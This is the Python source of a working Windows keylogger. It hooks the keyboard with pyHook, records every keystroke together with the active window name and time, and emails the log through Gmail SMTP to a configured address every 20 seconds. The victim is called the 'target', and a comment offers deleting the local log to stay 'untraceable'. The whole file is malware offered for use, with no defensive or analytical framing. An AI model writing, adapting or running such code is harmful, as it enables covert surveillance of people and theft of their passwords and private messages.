#   ÛÛÛÛÛÛÛÛÛ   ÛÛÛÛÛÛÛÛÛ  ÛÛÛÛÛ      
#  ÛÛÛ°°°°°ÛÛÛ ÛÛÛ°°°°°ÛÛÛ°°ÛÛÛ       
# ÛÛÛ     °°° °ÛÛÛ    °°°  °ÛÛÛ       
#°ÛÛÛ         °°ÛÛÛÛÛÛÛÛÛ  °ÛÛÛ       
#°ÛÛÛ          °°°°°°°°ÛÛÛ °ÛÛÛ       
#°°ÛÛÛ     ÛÛÛ ÛÛÛ    °ÛÛÛ °ÛÛÛ      Û
# °°ÛÛÛÛÛÛÛÛÛ °°ÛÛÛÛÛÛÛÛÛ  ÛÛÛÛÛÛÛÛÛÛÛ
#  °°°°°°°°°   °°°°°°°°°  °°°°°°°°°°° 


import pythoncom, pyHook, os
from datetime import datetime
# MIME is a standard for formatting files over the internet,
# so this module is required when sending the log through email
from email.mime.text import MIMEText
# module required to send emails
import smtplib
# this is for the timer, which will run on another thread
import threading

# the current date, this is to specify when the keylogger recorded the data
curr_date = datetime.now().strftime('%Y-%b-%d')
# the path to the where the log is stored:
path_log = "C:\\Users\\yourpath\\"+curr_date+".txt"
# the current window the target is on, e.g. notepad, google chrome, etc..:
program_name = ""

# prints starting message indicating keylogger has begun
data_log = open(path_log, "a")
data_log.write("\n\nBeginning KeyLogger...")
print("\n\nBegining KeyLogger...")
data_log.close()


# Records every character typed by the user and stores it into the log file
def get_keyboard_input(event):
        global program_name
        data_log = open(path_log, "a")

        # check if the target has changed windows/programs and compare with the previous one
        # if user is typing in new window (program), specify which one along with the time of access
        if program_name != event.WindowName:
            # write information regarding current program and date onto logging file
            data_log.write('\n===================================================\n')
            data_log.write('\n\nProgram: ' + event.WindowName + '\nWhen (Hours:Min:Sec): ' + datetime.now().strftime('%H:%M:%S') + '\n')
            # print statement isnt required but allows us to visually see whats happening, it can be removed
            print('\n===================================================\n')
            print('\nProgram: ' + event.WindowName + '\nWhen (Hours:Min:Sec): ' + datetime.now().strftime('%H:%M:%S') + '\n')
            # we assign the new window name if target changes windows and compare it with the next one, if its different
            # we have to tell the program to print it
            program_name = event.WindowName

        # Check if the inputted key is backspace, if so remove last character
        if event.Ascii == 8:
            print(" [BackSpace] ")
            filehandle = open(path_log, 'rb+')
            filehandle.seek(-1, os.SEEK_END)
            filehandle.truncate()
            filehandle.close()
            return True
        # Check if the inputted key is tab key (9), and indent 8 spaces
        if event.Ascii == 9:
            data_log.write("        ")
            print(" [TAB] ")
            return True
        # Check if the inputted key is New Line key (13), and add new line
        if event.Ascii == 13:
            data_log.write("\n")
            print(" [New Line] ")
            return True
        # Check for any other unknown characters, if found, do nothing
        # this is to avoid unregistered keys inputting annonymous characters into the log file
        # making it unreadable
        if event.Ascii < 32 or event.Ascii > 126:
            if event.Ascii == 0:
                pass  # do nothing
            else:
                data_log.write('\n' + chr(event.Ascii) + '\n')
        # if key is none of the above, then write character to log
        else:
            data_log.write(chr(event.Ascii))
            print(chr(event.Ascii))
        return True


# This function emails the data that was logged.
# In this case we are using GMAIL.
# In order to use a different server or port, change the following to your specified server/port:
# mail_server = smtplib.SMTP('smtp.gmail.com:587')
# For gmail you have to ensure that your account sets 'Allow less secure apps:' to 'ON', or this python
# function won't run since it doesn't have permission.
def email_data_log():
    to_email = 'youremail@gmail.com'
    file = path_log
    fp = open(file, 'r')
    msg = MIMEText(fp.read())
    fp.close()
    msg['Subject'] = 'subject'
    msg['From'] = 'from'
    msg['To'] = to_email
    mail_server = smtplib.SMTP('smtp.gmail.com:587')
    # for outlook you can switch the code above with this:
    # mailServer = smtplib.SMTP('smtp-mail.outlook.com', 587)
    mail_server.starttls()
    mail_server.login(to_email, 'yourpassword')
    mail_server.sendmail('target1', to_email, msg.as_string())
    mail_server.quit()


# periodically send data_log every 20 seconds once program starts.
# This function creates a thread, that repeats the process of sending the data log every 20 seconds
def send_log_periodically():
    threading.Timer(20.0, send_log_periodically).start()
    email_data_log()
    print("Sent Log")
    # if you want to remove temporary storage file after file is sent, in order to be untraceable, uncomment the line below
    # os.remove(path_log)


# Hookmanager registers callbacks from the mouse or keyboard
hm = pyHook.HookManager()
# KeyDown Registers the callback for keyboard events since we are only logging keyboard presses
hm.KeyDown = get_keyboard_input
# Begins watching for keyboard events.
hm.HookKeyboard()
# Start thread for periodically sending data for the log
send_log_periodically()
# pythoncom provides a windows message pump.
# When the program runs, this function allows the program to sit at idle and wait for Windows events.
# It does so in a continous loop also.
pythoncom.PumpMessages()

